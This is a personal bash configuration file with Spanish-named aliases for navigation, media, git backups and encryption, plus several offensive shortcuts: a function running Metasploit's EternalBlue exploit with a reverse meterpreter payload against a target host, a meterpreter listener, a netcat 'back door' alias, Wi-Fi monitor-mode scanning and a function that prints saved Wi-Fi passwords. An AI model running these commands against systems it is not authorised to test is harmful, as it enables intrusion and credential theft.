# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# If set, the pattern "**" used in a pathname expansion context will
# match all files and zero or more directories and subdirectories.
#shopt -s globstar

# make less more friendly for non-text input files, see lesspipe(1)
#[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
	# We have color support; assume it's compliant with Ecma-48
	# (ISO/IEC-6429). (Lack of such support is extremely rare, and such
	# a case would tend to support setf rather than setaf.)
	color_prompt=yes
    else
	color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls -tF --color=auto' 
    alias lx='ls -atF --color=auto'
    alias ll='ls -ltF --color=auto'
    alias rm='rm -ir'
    alias editip='cat /etc/network/interfaces'
    alias ld='ls -d --color=auto */'
    alias k9='cd /xg/0r'
    alias escritorio='cd /root/Escritorio'
    alias documentos='cd /root/Documentos'
    alias descargas='cd /root/Descargas'
    alias videos='cd /root/Vídeos'
    alias imagenes='cd /root/Imágenes'
    alias musica='cd /root/Música'
#   Alias temporales #
alias UbeeD854-2.4G="echo '172.26.248.142'"
alias ARRIS-0FF2="echo '172.27.0.122'"
alias Ubee9816-2.4G="echo '172.26.237.48'"
###########################################################

############## sistema #############################
    alias pxx='poweroff'
    alias pxs='systemctl suspend'
    alias phh='systemctl hibernate'
    alias cls='clear'
### * 
 alias puertos="   echo '                      ░▒▓█🇵​​​​​ 🇺​​​​​ 🇪​​​​​ 🇷​​​​​ 🇹​​​​​ 🇴​​​​​ 🇸​​​​​  ░A░c░t░i░v░o░s░'  
echo ''
netstat -tulpn"
### * 
alias htopp='ps -ef'
  alias ipp="curl ifconfig.me" > /dev/null 2>&1
   alias iip="ip route show|grep ' src ' |cut -d' ' -f9"

 








    #####carpeta alias #####
    alias dess='sh /xg/0r/alias/d'
    alias chrome='sh /xg/0r/alias/g'
   alias azureus="cd /root/Documentos/vuze && ./azureus &" > /dev/null 2>&1
#  alias tunnel='sh /xg/0r/alias/tunnel'
    alias red='sh /xg/0r/alias/red'
    alias ips='sh /xg/0r/alias/ips && speedtest-cli'
    alias clima='sh /xg/0r/alias/climm'
    alias rarx="sh /xg/0r/alias/rarr" 
 alias mapa='telnet mapscii.me'
    alias nmapx="sh /xg/0r/alias/nmapxx && nmap -Pn -F -T4 -sV -A -v"
    alias nmapOS='nmap -F -O2 -Pn'
  alias torb='cd /opt/tor-Bro ; ./start-tor-browser &'
    ########################
    alias msfconsole='clear && msfdb init > /dev/null 2>&1 ; msfconsole'
  alias upgrade.msf='sh /xg/msfupgrade'
####-
    alias ytdl="sh /xg/0r/alias/desvideos && cd ; cd Vídeos/ && youtube-dl"
   alias up-ytdl='pip install --upgrade youtube-dl'
alias upip='python3 -m pip install --upgrade pip'

   # alias beetas='cd /xg/0r/.betas && ls'
alias crear='sh /xg/0r/alias/crear'
alias subb='/opt/sublime_text/sublime_text'   



#########  S E R V I D O R E S #############################
    alias nginx='sh /xg/0r/alias/nginnx && nginx'
    alias nginxx='nginx -s stop && sh /xg/0r/alias/nginnx00f'
  
    alias ximple="sh /xg/0r/.betas/bann/simple-server2 && sh /xg/0r/.betas/bann/simple-server2r &&python3 -m http.server"
alias key.wifi='cd /etc/NetworkManager/system-connections/ ; ls'




############ Wifi   ------------------
                    # alias wfx1="airmon-ng start wlan1 && wash -i wlan1mon ; airmon-ng stop wlan1"
alias wfx0="airmon-ng start wlan0 && wash -i wlan0mon ; airmon-ng stop wlan0"
alias xxwi='airmon-ng stop wlan0mon'
alias wixx='airmon-ng start wlan0'
 
 alias xxw1='airmon-ng stop wlan1mon'
alias w1xx='airmon-ng start wlan1'
                                      # alias wfxx='sh /xg/0r/alias/wifixx0'

                                      # alias xwf='airmon-ng stop'
                                      # alias wfx='airmon-ng start'
                                      ######################################

################# Tunnel #####################
alias  sshx='service ssh start ; service ssh status'
alias  xssh='service ssh stop'



   alias gitt='cd /opt/gitt && sh /xg/0r/.betas/bann/gittt && git clone' 
                                         #alias t0r='kalitorify -t'
                                         #alias t0ff='kalitorify -c'
                                         #alias t0rs='kalitorify -s'
   alias xt0r='service tor stop'
alias deepweb='torsocks axel'
   alias t0r='service tor start ; service tor status'
   alias tor='tor &'
   alias iptor="torsocks curl ifconfig.me"

  alias mclima='curl wttr.in/morelia,Mexico?lang=es'


#######  back door #####################
  alias xcat='sh /xg/0r/alias/xcatt' 
  alias xchat='sh /xg/0r/alias/xchatt' 
 alias bdoor='sh /xg/0r/alias/bbdoor ; nc -nv'

##### compresores  encriptador ################
   alias tta='tar -cvf'
   alias ttx='tar xvf'

   alias rrx='rar x'
   alias rra='rar a -hp'

   alias d3='sh /xg/0r/.betas/bann/banCript2 ; ccrypt -d'
   alias c0='sh /xg/0r/.betas/bann/banCript1 ; ccrypt -e'


#### audios ######
alias mpv0='mpv --no-video'
 alias  mppv='ls *.mp3 && sh /xg/0r/.betas/bann/mpv-logo && mpv --no-video --shuffle *.mp3'
alias st0ner='sh /xg/0r/alias/st0ner'
     alias muxx="sh /xg/0r/.betas/bann/electromux-bnn ;  mpv --no-video https://www.youtube.com/watch?v=DFja7QOAvYM" 
     alias m0r="sh /xg/0r/alias/bnnmor ; mpv --no-video /xg/0r/w/aliaxx/mor.pls" 
alias rdub="sh /xg/0r/.betas/bann/banndub ;  mpv --no-video https://www.youtube.com/watch?v=znqMKJEfaQk" 
alias mocc='mocp -T transparent-background'
#apt-get install moc-ffmpeg-plugin
#################
alias synth.='<sh /xg/0r/.betas/bann/electromux-bnn ; mpv --no-video http://stream.syntheticfm.com:8040/live'
alias w33d="sh /xg/0r/.betas/bann/banw33d ; echo -n '  🎵 🎶 ' && rm -f ll ; mpv --no-video http://79.120.77.11:9089/"


alias rock420="sh /xg/0r/.betas/bann/ban420 ; echo -n '  🎵 🎶 ' && rm -f ll ; mpv --no-video https://listen.radioking.com/radio/10713/stream/224413"
alias ytdlv='cd /root/Vídeos && youtube-dl'




alias editt.ssh='nano /etc/ssh/sshd_config'
alias editt='nano /etc/nginx/sites-enabled/default'
alias edit.butterfly='nano /usr/local/bin/butterfly.server.py'
                                        ########### Reparar architecture i386
                                        ######
                                        #             dpkg --add-architecture i386 && apt-get update &&
                                        ####          apt-get install wine32
                                        #########################

                                        #                                        
                                        ### apt-get install android-tools-adb android-tools-fastboot
                                        ##### Up VLC 
                                        ####         sed -i 's/geteuid/getppid/' /usr/bin/vlc

fi

# some more ls aliases
#alias ll='ls -l'
#alias la='ls -A'
#alias l='ls -CF'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
azzu="\[$(tput setaf 4)\]"
veer="\[$(tput setaf 2)\]"
cyy="\[$(tput setaf 6)\]"
rooj="\[$(tput setaf 1)\]"
roos="\[$(tput setaf 5)\]"
amma="\[$(tput setaf 3)\]"
blan="\[$(tput setaf 7)\]"
fnn="\[$(tput sgr0)\]"
zzu='\e[4m'

c0l1="$(sh /xg/0r/.betas/i/color)"
clxx="$(sh /xg/0r/.betas/i/colorr)"
c0l2="$(sh /xg/0r/.betas/i/color2)"

#ussbb="$(ls /media/root)"
#
#usbr="$ussbb"

  #  alias usb='nemo /media/root/$ussbb &'
#m4t="$(sh /xg/0r/.betas/i/matrixc0l0r)"
#cmatrix -B -C $m4t -u 4 -s


#k00="$(ls|sed -n '1p' >> k0 && cat k0 && rm -f k0)"
#alias x1='$k00'

alias rrarr="rar a -hp"
alias update.bashrc='cp /root/.bashrc /xg'
     alias bashrc.encriptado="cp /root/.bashrc /xg/0r/.betas ; ccrypt -e .bashrc ; mv .bashrc.cpt .bashrc"



function gitupt99 () { cp -r /xg/0r/t99/99/ban /opt/99t/99 ; cp -r /xg/0r/t99/99/0 /opt/99t/99 ; cp -r /xg/0r/t99/99/00 /opt/99t/99 ; cd /opt/99t ; git init; git add iii  bash.bashrc  99/  nginx.conf ; git commit -m 'Termux-Tel-bash' ; git push origin master;}

function gitup.t9 () { git init; cd /xg/0r/t99 ; git add iii  bash.bashrc  99/  nginx.conf; git commit -m "bash_--termux--_tel" ; git push --set-upstream origin main ;}
function gitup.aliax () { git init; cd /xg/0r/w ; git add  iiiw.bat  aliax.bat  aliaxx/; git commit -m "bat.aliax.win" ; git push origin master ;}
function gitup.respald0 () { rar a -hp /opt/ciudad01/dep0sito/ciudad.cero.un0 /opt/ciudad01/deposito/; ccrypt -e /opt/ciudad01/dep0sito/ciudad.cero.un0.rar  ; mv /opt/ciudad01/dep0sito/ciudad.cero.un0.rar.cpt /opt/ciudad01/dep0sito/ciudad.cero.un0  && tree /opt/ciudad01/dep0sito ; read push ;cd /opt/ciudad01 ; git init ; git add  dep0sito/; git commit -m "h0me" ; git push origin master ;}
function gitup.home () {  cd /xg ; git init; git add /xg/0r/.betas/bann /xg/0r/.betas/i /xg/0r/.betas/necr0 /xg/0r/.betas/.bashrc /xg/0r/alias; git commit -m "bbash.home" ; git push origin master ;}



function d3ss () { sh /xg/0r/.betas/bann/banCript2 ;ccrypt -d "$1" ;rar x "$1";}
function c0mm () { rar a -hp "$1" "$2"; ccrypt -e "$1" ;}


function muux () { sh /xg/0r/.betas/bann/electromux-bnn &&  mpv --no-video "$1" ; sh /xg/0r/.betas/bann/electromux-bnn &&  mpv --no-video "$2" ; sh /xg/0r/.betas/bann/electromux-bnn &&  mpv --no-video "$3" ; sh /xg/0r/.betas/bann/electromux-bnn &&  mpv --no-video "$4" ; sh /xg/0r/.betas/bann/electromux-bnn &&  mpv --no-video "$5" ;}
function mmpv () { clear ; sh /xg/0r/alias/mpvv ; elinks "$1" >> ll ; n0m="$(cat ll|sed 's/]/ /g'|grep -w 10|sed '/http/d'|sed 's/(alternate)//g'|cut -d ' ' -f6-30)" && echo "        $n0m"  && echo '' && echo -n '  🎵 🎶 ' && rm -f ll ; mpv --no-video "$1" ; }

function ytdl3 () { sh /xg/0r/.betas/bann/logo-ytube ; mkdir mm ; cd mm ; youtube-dl -i --extract-audio --audio-format mp3 --audio-quality 0 "$1" ; elinks "$1" >> ll ; n0m="$(cat ll|sed 's/]/ /g'|grep -w 9|sed '/http/d'|sed 's/(alternate)//g'|sed 's/(LYRIC VIDEO)//g' |cut -d ' ' -f6-30)" && mv *.mp3 "$n0m.mp3" ; mv *.mp3 ../ ; cd .. ; rm -fr mm ; pwd && echo '' && ls *.mp3  ; }

function tunnel () { sh /xg/0r/alias/tunnel ; ip=$(ip route show|grep ' src ' |cut -d' ' -f9) && butterfly.server.py --host=$ip --port="$1" --login --unsecure  ; }

function ntc () { sh /xg/0r/99/00/ntc ; nc -vn "$1" "$2" ; }


function k3y.wifi () {  cat "$1"|grep -w psk|sed 's/key-mgmt=wpa-psk//g'| sed 's/psk=/Clave.Wifi: /g';}

function etxx () { ip=$(ip route show|grep ' src ' |cut -d' ' -f9) && msfconsole -x "use exploit/multi/handler;set PAYLOAD windows/'$2'meterpreter/reverse_http;set LPORT '$1';set LHOST $ip;exploit"; }
    
    function eblux () {  sh /xg/0r/.betas/bann/bannEternal ; ip="$(ip route show|grep ' src ' |cut -d' ' -f12)" && msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue;set RHOST '$1';set PAYLOAD windows/x64/meterpreter/reverse_tcp;set LHOST $ip;set ExitOnSession false;set LPORT 2021;exploit";}



function sysinfo () { cd /opt/gitt/neofetch ; ./neofetch ; cd ;}
# function wifix () { airmon-ng start "$1" ; wash -i wlan"$1"mon ; read ; airmon-ng stop wlan"$1" ; }

function climma () { curl wttr.in/"$1",Mexico?lang=es;}
# function xwifi () {  ; }


  function limpiar () {  free -h 
echo "

    Ｌ ｉ ｍ ｐ ｉ ａ ｎ ｄ ｏ ．．． 🚮

"
sync; echo 3 > /proc/sys/vm/drop_caches 
apt-get autoclean > /dev/null 2>&1
apt-get clear cache > /dev/null 2>&1
echo "

------------------------------------------
     L I M P I Σ Z Λ    ᄃ Ө M P ᄂ Σ Ƭ Λ D Λ  ✅
     "
free -h ;}




############# bnn de inicio ##############################
sh /xg/0r/.betas/i/todo-el-dia
##########################################################


#cmux="$(cat /root/Música/muxx)"

#alias cybermux='$cmux'

#cybermux
#PS1="$amma│$rooj\u$amma├──────────┐ $fnn┤$veer\w$blan$fnn├  
#[$zzu$c0l1\@$fnn$c0l2$fnn]$amma └─────────[$fnn💀"




#PS1=┌─┤"$rooj\u$fnn├
#└──╼$fnn📂[ $azzu\w$blan$fnn ]
#┌──$fnn[$c0l1\@$fnn$c0l2$fnn]
#└┤$fnn💀"

PS1="$clxx╦╣$rooj\u$fnn  ║ $azzu\w$blan$fnn ╔📂
$clxx╠╗╩╦╝$c0l1\@$fnn$c0l2$fnn
$clxx╔╩╬$fnn"

# PS1=" ╔$rooj\u$fnn ║ $azzu\w$blan$fnn 📂      
#╔╩═║$c0l1\@$fnn$c0l2$fnn
#╚╬"
